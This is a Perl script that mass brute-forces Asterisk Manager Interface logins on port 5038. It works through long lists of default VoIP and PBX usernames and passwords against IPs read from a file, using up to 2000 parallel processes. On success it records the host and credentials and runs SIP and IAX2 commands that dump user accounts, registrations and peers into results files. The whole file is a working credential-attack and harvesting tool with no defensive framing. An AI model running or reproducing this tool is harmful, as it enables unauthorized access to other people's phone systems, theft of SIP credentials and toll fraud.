#!/usr/bin/perl

use Parallel::ForkManager;
use Net::Telnet;

#wwwadmin
my @users = ( 'cron',
'wwwadmin',
'admin',
'phpagi',
'admin',
'dialer',
'test',
'panel',
'munin',
'outcall',
'hudpro',
'phoneglue',
'monast_user',
'myasterisk',
'user',
'mark',
'eventmanager',
'manager',
'crm',
'astercc',
'livechat',
'astconf',
'php',
'galaxy',
'orderlystats',
'asteriskclient',
'amp111',
'1234',
'password',
'12345',
'123456',
'l00tsc00t',
'123',
'monast_secret',
'mycode',
'mysecret',
'asterisksecret',
's3cr3t',
'pa55w0rd',
'secret',
'dialer..manager',
'ripencc',
'stats4STATS',
'1234567',
'master123',
'freepbx',
'asteriskuser',
'support',
'root',
'administrator',
'super',
'<empty>',
'system',
'Root',
'ADMIN',
'voip',
'guest',
'User',
'router',
'tux',
'eLaStIx.asteriskuser.2oo7',
'newpassword',
'Asterisk',
'freeadmin',
'palosanto',
'maint',
'standarduser',
'mypassword',
'test1',
'strustville',
'22222',
'passworm',
'c2call',
'kermit',
'Admin',
'Administrator',
'cisco',
'installer',
'Polycom',
'ALT+S',
'*From Ext',
'Iwatsu',
'supervisor',
'login',
'**266344',
'**CONFIG',
'266344',
'administrator ',
'amiuser',
'portal',
'terrasoft',
'hello',
'amp109',
'PHP',
'asterisk',
'operator',
'out',
'call',
'USER',
'admin1',
'useradmin',
'superadmin',
'dpro',
'di',
'aler',
'phone',
'glue',
'event',
'tercc',
'alaxy',
'orderl',
'ystats',
'client',
'Manager',
'csf',
'administration',
'admintelecom',
'AMandA',
);
my @passs = ('1234',
'amp111',
'password',
'support',
'wwwadmin',
'admin',
'phpagi',
'cron',
'dialer',
'test',
'panel',
'munin',
'outcall',
'hudpro',
'phoneglue',
'monast_user',
'myasterisk',
'user',
'mark',
'eventmanager',
'manager',
'crm',
'astercc',
'livechat',
'astconf',
'php',
'galaxy',
'orderlystats',
'asteriskclient',
'1234',
'12345',
'123456',
'l00tsc00t',
'123',
'monast_secret',
'mycode',
'mysecret',
'asterisksecret',
's3cr3t',
'pa55w0rd',
'secret',
'dialer..manager',
'ripencc',
'stats4STATS',
'1234567',
'master123',
'root',
'administrator',
'super',
'<empty>',
'system',
'Root' ,
'ADMIN',
'voip',
'guest',
'User',
'router',
'tux',
'eLaStIx.asteriskuser.2oo7',
'newpassword',
'Asterisk',
'freeadmin',
'freepbx',
'palosanto',
'maint',
'standarduser',
'mypassword',
'test1',
'strustville',
'22222',
'passworm',
'secret123',
'Mysecret',
'asterisk',
'packet',
'kermit',
'Administrator',
'cisco',
'**#',
'1000',
'456',
'Sonus12345',
'AMandA',
'I*746*',
'0000',
'Dist',
'PlsChgMe1',
'0',
'**266344',
'**CONFIG',
'266344',
'adminpass',
'4321',
'00000000',
'FrUyHn6FSaX',
'secret123password',
'amppass123',
'123456789',
'1234567890',
'12345678',
'terrasoft',
'msf',
'world',
'amiuser',
'portal',
'SECRET',
'Secret',
'secret5',
'secret1234',
'secret1',
'password1',
'password123',
'password1234',
'manager_pwd',
'admin123',
'admin12345',
'admin123456',
'admin1',
'god',
'linux',
'toor',
'elastix',
'99pir3208',
'8u9sdgk',
'my_secret',
'elastix456',
'pass123',
'pass1234',
'admin@pass',
'admin.pass',
'admin.admin',
'pass@admin',
'operator1',
'operator123',
'manager123',
'manager1234',
'c2call',
'amp109',
'operator',
'out',
'call',
'useradmin',
'superadmin',
'dpro',
'di',
'aler',
'phone',
'glue',
'event',
'tercc',
'alaxy',
'orderl',
'ystats',
'client',
'administration',
'admintelecom',
'asteriskuser',
'Root',
);

my @foundip;

my $user = "admin";
my $pass = "admin";
my $i = 0;


$forkmanager = new Parallel::ForkManager("2000");

$forkmanager->run_on_finish(sub {    # must be declared before first 'start'
    my ($pid, $exit_code, $ident, $exit_signal, $core_dump, $data) = @_;
    $out{ $data->[0] } = $data->[1];
        #print "[onfinish]". $data->[0] ."\n";
        if (($data->[1] == -1) or ($data->[1] == 1)) {
                push(@foundip,$data->[0]);
        }

});

my $worked="Roots.txt";
open(DAT,">>$worked");
print DAT "\n!!!!! Started !!!!!!\n";
close(DAT);

my $foundstring;
my $cnt =0;
my $match_found = 0;
foreach $user (@users) {
foreach $pass (@passs) {
        print "\n==new user===\n";

        print $pass . " - ";
        print $passs[$i];

        print "\n============\n\n";
        $i++;
        $cnt =0;

        #print "\nFOUND:\n@foundip\n";
        my $rez = 0;
        open($foundipFILE, "< ips");
        while (<$foundipFILE>) {

                $line = $_;
                $line =~ s/\x0a//g;

                if (!grep {$_ eq $line} @foundip) {

                        $cnt++;
                        my $pid = $forkmanager->start and next;


                        $rez = 0;
                        $rez = oneIpTelnet($line,$user,$pass);
                        #$rez = $cnt % 3;

                        if ($rez == -1){
                                #print $cnt ." " .$line ."failed connect \n";
                                print "[$cnt] [$line] failed connect \n";
                        }elsif ($rez == 1){
                                print "[$cnt] [$line] WORKED with $user : $pass \n";

                        }else {
                                print "[$cnt] [$line] failed with $user : $pass \n";
                        }
                        sleep(1);
                        $forkmanager->finish(0, [ $line, $rez ]);   # Child exits

                }else{
                        #print "!!!!! $line was here\n";
                }



        }
        close($foundipFILE);

}
}

$forkmanager->wait_all_children();
print "\n!!!!! FINISH !!!!!!\n";

$worked="Roots.txt";
open(DAT,">>$worked");
print DAT "\n!!!!! FINISH !!!!!!\n";
close(DAT);




sub oneIpTelnet{

        my ($result, $t);
        my @parms = @_;

        my $host=$parms[0];
        my $user=$parms[1];
        my $pass=$parms[2];

        #print $host;

        my $result0 = 0;

        use Net::Telnet ();
    $t = new Net::Telnet (
                Port => 5038
                , Timeout => 7
                , Prompt => '/.*[\$%#>] $/'
                , Output_record_separator => ''
                , Errmode => "return"

        );
        $t->open($host) or return -1; #$result0 = -1;
        ($result) = $t->waitfor('/(.*)\n$/');                   # print login
        print $result;

        if ($pass eq "l00tsc00t"){
                my $connected="connected.txt";
                open(DAT,">>$connected");
                print DAT "$host connected with message $result\n";
                close(DAT);
        }


        $t->print("Action: Login\nUsername: $user\nSecret: $pass\nEvents: off\n\n");
        ($result) = $t->waitfor('/Authentication accepted/');           # waitfor auth accepted

        if (index($result, "Success") != -1) {
                print "$result contains $Success\n";
                $result0 = 1;
                #push(@foundip, $host);
                $worked="Roots.txt";
                open(DAT,">>$worked");
                print DAT "$host WORKED with $user : $pass \n";
                close(DAT);
        }
        print $result;

        if ($result0 == 1){
                $worked="Results.txt";
                open(DAT,">>$worked");
                print DAT "\n\n==========\n==========\n==========\n==========\n";
                print DAT "$host WORKED with $user : $pass \n";



                #print "sip show users\n";
                print DAT "[sip show users]\n";
                $t->print("ACTION: COMMAND\ncommand: sip show users\n\n");
                ($result) = $t->waitfor('/--END COMMAND--\n$/');
                #print $result;
                print DAT "$result\n";



                #print "iax2 show users\n";
                print DAT "[iax2 show users]\n";
                $t->print("ACTION: COMMAND\ncommand: iax2 show users\n\n");
                ($result) = $t->waitfor('/--END COMMAND--\n$/');
                #print $result;
                print DAT "$result\n";

				

                #print "sip show registry\n";
                print DAT "[sip show registry]\n";
                $t->print("ACTION: COMMAND\ncommand: sip show registry\n\n");
                ($result) = $t->waitfor('/--END COMMAND--\n$/');
                #print $result;
                print DAT "$result\n";
				

				
                #print "sip show peers\n";
                print DAT "[sip show peers]\n";
                $t->print("ACTION: COMMAND\ncommand: sip show peers\n\n");
                ($result) = $t->waitfor('/--END COMMAND--\n$/');
                #print $result;
                print DAT "$result\n";



                close(DAT);
        }




        @hangup = $t->cmd(String => "Action: Logoff\n\n", Prompt => "/.*/");
        $t->buffer_empty;
        $ok = $t->close;

        return $result0;
}
